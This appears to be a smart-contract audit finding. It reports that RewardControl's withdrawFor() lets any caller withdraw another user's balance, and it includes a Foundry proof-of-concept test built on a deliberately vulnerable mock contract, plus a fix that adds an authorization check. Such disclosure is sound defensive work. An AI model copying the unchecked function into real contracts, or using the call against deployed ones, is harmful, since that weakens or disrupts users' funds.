# Vulnerability details

## Description
The RewardControl contract's withdrawFor() has a vulnerability. This function allows any address to withdraw funds from any other address's balance without any authorization checks.

Vulnerable function:
```
  function withdrawFor(address from, uint256 amount) external {
        _withdraw(from, from, amount);
    }
```
The function directly calls the internal _withdraw function without verifying if the msg.sender has the authority to withdraw on behalf of the from address.

## Impact
This vulnerability allows any user to withdraw the balance of any other user in the contract. As demonstrated in the PoC (see testVulnerableWithdrawFor in the attached test file), an attacker can call withdrawFor with any user's address and successfully initiate a withdrawal of their entire balance.

While the attacker doesn't receive the funds directly, this vulnerability still presents several serious issues:

1. Any user can forcibly withdraw another user's funds from the contract, even if those funds are returned to the original owner.

2. Potential for Denial of Service: An attacker could repeatedly drain users' balances, forcing them to constantly redeposit funds to use the contract's services.
3. Breaking of Contract Invariants: If the contract relies on users maintaining certain balances for functionality.


## POC

The PoC shows that when an attacker calls withdrawFor with Alice's address:

Alice's initial balance of 5 ETH in the contract is reduced to 0 ETH.
The withdrawn funds (5 ETH) are sent to Alice's address, not the attacker's.
The attacker's ETH balance remains unchanged at 1 ETH.

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

// Mock EIP712 implementation for testing
abstract contract MockEIP712 {
    function _domainNameAndVersion() internal pure virtual returns (string memory, string memory);
    function _hashTypedData(bytes32) internal view virtual returns (bytes32);
}

// Mock SafeTransferLib implementation
library MockSafeTransferLib {
    function safeTransferETH(address to, uint256 amount) internal {
        (bool success, ) = to.call{value: amount}("");
        require(success, "ETH transfer failed");
    }
}

// Vulnerable RewardControl contract (precise implementation)
contract VulnerableRewardControl is MockEIP712 {
    using MockSafeTransferLib for address;

    uint256 private constant FULL_BALANCE = 0;

    bytes32 public constant WITHDRAW_TYPEHASH =
        keccak256("Withdraw(address from,address to,uint256 amount,uint256 nonce,uint256 deadline)");

    mapping(address account => uint256 nonce) public nonces;
    mapping(address account => uint256 balance) public balanceOf;

    event Deposit(address indexed from, address indexed to, bytes4 indexed reason, uint256 amount, string comment);
    event Withdraw(address indexed from, address indexed to, uint256 amount);

    function deposit(address to, bytes4 reason, string calldata comment) external payable {
        require(to != address(0), "InvalidAddressZero");
        balanceOf[to] += msg.value;
        emit Deposit(msg.sender, to, reason, msg.value, comment);
    }

    function withdraw(address to, uint256 amount) external {
        _withdraw(msg.sender, to, amount);
    }

    function withdrawFor(address from, uint256 amount) external {
        _withdraw(from, from, amount);
    }

    function _withdraw(address from, address to, uint256 amount) internal {
        require(to != address(0), "InvalidAddressZero");
        uint256 balance = balanceOf[from];
        if (amount == FULL_BALANCE) {
            amount = balance;
        }
        require(amount <= balance, "InvalidAmount");
        balanceOf[from] = balance - amount;
        emit Withdraw(from, to, amount);
        to.safeTransferETH(amount);
    }

    function _domainNameAndVersion() internal pure override returns (string memory name, string memory version) {
        return ("PHI Rewards", "1");
    }

    function _hashTypedData(bytes32 structHash) internal view override returns (bytes32) {
        return structHash; // Simplified for testing
    }
}

contract RewardControlVulnerabilityTest is Test {
    VulnerableRewardControl public rewardControl;
    address public alice = address(0x1);
    address public bob = address(0x2);
    address public attacker = address(0x3);

    function setUp() public {
        rewardControl = new VulnerableRewardControl();
        vm.deal(alice, 10 ether);
        vm.deal(bob, 10 ether);
        vm.deal(attacker, 1 ether);
    }

    function testVulnerableWithdrawFor() public {
        // Alice deposits 5 ETH
        vm.prank(alice);
        rewardControl.deposit{value: 5 ether}(alice, bytes4(0), "");
        emit log_named_decimal_uint("Alice's initial balance", rewardControl.balanceOf(alice), 18);

        // Attacker attempts to withdraw Alice's funds
        vm.prank(attacker);
        rewardControl.withdrawFor(alice, 5 ether);

        // Check balances after the attack
        emit log_named_decimal_uint("Alice's balance after attack", rewardControl.balanceOf(alice), 18);
        emit log_named_decimal_uint("Attacker's ETH balance", attacker.balance, 18);
    }
}
```

## Recommended Mitigation Steps

Implement proper authorization checks in the withdrawFor function.
```
function withdrawFor(address from, uint256 amount) external {
    require(msg.sender == from || isAuthorized(msg.sender, from), "Not authorized");
    _withdraw(from, from, amount);
}
```
